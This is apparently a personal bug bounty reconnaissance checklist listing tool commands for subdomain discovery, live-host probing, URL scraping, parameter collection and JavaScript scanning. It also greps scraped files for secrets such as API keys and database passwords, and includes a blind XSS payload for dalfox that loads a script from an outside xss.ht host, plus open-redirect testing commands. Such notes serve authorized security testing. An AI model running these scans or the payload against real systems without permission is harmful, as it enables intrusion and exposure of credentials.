What are our objectives for Bug Bounty?
• Discover maximum amount of sub domains.
• Determine what number of sub domains are live with httpx and httprobe. 
• Discover what’s on the live pages with aquatone. 
• Take live pages and scan them for content.
• Manually explore webpages with most interesting content.
Once we’ve fully explored webpages, test them for vulnerabilities.


BUG BOUNTY RECON METHODOLOGY
1. Gather subdomains with amass or via ProjectDiscovery Chaos
		a. https://chaos.projectdiscovery.io/#/
2. Determine which hosts are alive with httprobe
		a. Cat [domain list] | httprobe
		b. Cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt
3. Use httpx to find status code 200 subdomains
		a. cat online-domains.txt | httpx -status-code -o httpx.txt | grep 200
		b. Cat online-domains.txt | httpx -status-code 
4. Get a deeper collection of subdomains with DNSGEN
		a. Cat online-domains.txt | dnsgen - | httprobe
		b. cat online-domains.txt | dnsgen - | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee DNSGEN_online-domains.txt
5. Grep for all the domains with status code 200
	e. Cat httpx.txt | grep 200
	f. Save / edit responses to live.txt
	g. Make sure to clear code 200
		a. Replace [200] with blank
6. Run aquatone against live hosts 
	a. Cat live.txt | aquatone
7. Review screenshots and pages of live hosts gathered
8. Run hakrawler, GAU, and WayBack to scrape subdomains
	a. Hakrawler
	b. GAU
		a. cat domains.txt | ~/go/bin/gau -t 5
	c. WayBackURLs
		a. Echo '[URL]' | waybackurls > wayback
		b. Use wc -l to get the amount of lines in a file.
		c. cat live.txt | waybackurls > wayback
		d. cat live.txt | ~/go/bin/waybackurls > wayback
9. Focus on certain subdomains
	a. Staging, Dev, and other uncommon names
	b. Payment, internal, qa, backup, etc.
10. Look for API data in source code.
	a. Cat (page source).txt | grep API
11. Collect Parameters with arjun
	a. arjun -i targets.txt
	b. arjun -u https://api.example.com/endpoint
12. Collect parameters with Parth
	a.  python3 parth.py -t playstation.com | tee playstationCom.txt
13. Run jsscanner to look into JS files
	a. Change the contents in the alive.txt file with the domains we want to scrape.
	b. /JSCCanner/script.sh [path to file]
14. Run JSFinder as a backup
	a. python3 /root/Desktop/tools/JSFinder/JSFinder.py -f /root/Desktop/Bug_Bounty/playstation/PlaystationCom/live.txt
15. Run grep against the .js files and search for keywords
	a. API
	b. Secret
	c. Db_key
	d. Db_password
16. Use GF to look for parameters that follow exploit patterns:
	a. cat subdomains.txt | waybackurls | sort -u >> waybackdata
	b. cat waybackdata | gf redirect | tee -a redirect.txt
	c. XSS
		a. dalfox file xss.txt -b '"><script src=https://ch1r0n1n.xss.ht></script>' pipe -F
	d. OPEN REDIRECT
		1. python3 openredirex.py -l /root/Desktop/Bug_Bounty/Sqills/redirect.txt --payloads payloads.txt
		2. python3 Injectus.py -f /root/Desktop/Bug_Bounty/dhs/redirect.txt -op
	e. SSRF
	f. IDOR
	g. LFI
17. Check parameters for following:
	• Open Redirect
	• XSS
	• IDOR
18. Check for low hanging fruit with Nuclei
	a.  nuclei -l [target list] -t /root/Desktop/tools/Nuclei-Templates/
